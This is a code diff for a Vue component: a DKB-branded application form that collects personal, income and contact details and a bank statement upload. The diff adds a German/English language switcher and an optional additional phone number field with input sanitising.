@@ -6,7 +6,6 @@ import LogoDkbPng from "@/assets/logo_dkb.png";
 import ModalBook2 from "@/assets/MODAL_BOOK_2.jpg";
 import ModalBook from "@/assets/MODAL_BOOK.svg";
 
-const { t } = useI18n();
 
 const form = ref({
   firstName: "",
@@ -20,6 +19,7 @@ const form = ref({
   additionalIncomeCurrency: "EUR",
   email: "",
   phone: "+",
+  additionalPhone: "+",
   residentialAddress: "",
   workplace: "",
   position: "",
@@ -28,7 +28,17 @@ const form = ref({
   bankStatementFile: null as File | null,
 });
 
+const { t, locale } = useI18n();
+const changeLanguage = (lang: string) => {
+  locale.value = lang;
+  sessionStorage.setItem('lang', lang);
+};
+const getLanguageLabel = () => {
+  return locale.value === 'de' ? 'DE' : 'EN';
+};
+
 const hasAdditionalIncome = ref(false);
+const hasAdditionalPhone = ref(false);
 
 const isSubmitting = ref(false);
 const errorMessage = ref("");
@@ -79,6 +89,22 @@ function handlePhoneInput(e: Event) {
   const digits = value.slice(1).replace(/\D/g, "");
   form.value.phone = "+" + digits;
 }
+
+function additionalPhoneInput(e: Event) {
+  const target = e.target as HTMLInputElement;
+  let value = target.value;
+  value = value.replace(/[^\d+]/g, "");
+
+  if (!value.startsWith("+")) {
+    value = "+" + value.replace(/\D/g, "");
+  } else {
+    const digitsPart = value.slice(1).replace(/\D/g, "");
+    value = "+" + digitsPart;
+  }
+  const digits = value.slice(1).replace(/\D/g, "");
+  form.value.additionalPhone = "+" + digits;
+}
+
 function handleWorkplaceInput(e: Event) {
   const target = e.target as HTMLInputElement;
   let value = target.value;
@@ -180,6 +206,9 @@ async function onSubmit() {
       additional_income_currency: additionalIncomeCurrencyStr,
       email: form.value.email,
       phone: form.value.phone,
+      additional_phone: hasAdditionalPhone.value
+        ? form.value.additionalPhone
+        : "",      
       residential_address: form.value.residentialAddress,
       workplace: form.value.workplace,
       position: form.value.position,
@@ -236,6 +265,30 @@ async function onSubmit() {
           <img :src="LogoDkb" alt="DKB" class="h-14 w-auto" />
           <!-- <p class="tetx-[18px] text-[#006AC7] font-medium">FAQ</p> -->
         </div>
+        <div class="flex gap-8">
+            <v-btn
+              variant="text"
+              append-icon="mdi-chevron-down"
+              rounded="lg"
+              class="font-semibold text-xs sm:text-base uppercase text-[#006AC7] pt-2"
+            >
+              {{ getLanguageLabel() }}
+              <v-menu activator="parent">
+                <v-list>
+                  <v-list-item
+                    title="DE"
+                    class="uppercase"
+                    @click="changeLanguage('de')"
+                  />
+                  <v-list-item
+                    title="EN"
+                    class="uppercase"
+                    @click="changeLanguage('en')"
+                  />
+                </v-list>
+              </v-menu>
+            </v-btn>
+      </div>
       </div>
     </header>
     <div class="flex-1">
@@ -410,6 +463,19 @@ async function onSubmit() {
               <input
                 :value="form.phone"
                 @input="handlePhoneInput"
+                type="tel"
+                required
+                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                placeholder="+12345678901"
+              />
+            </div>
+            <div>
+              <label class="block text-sm font-medium text-slate-700 mb-1">
+                {{ $t('quiz.handlePhoneInput') }} *
+              </label>
+              <input
+                :value="form.additionalPhone"
+                @input="additionalPhoneInput"
                 type="tel"
                 required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
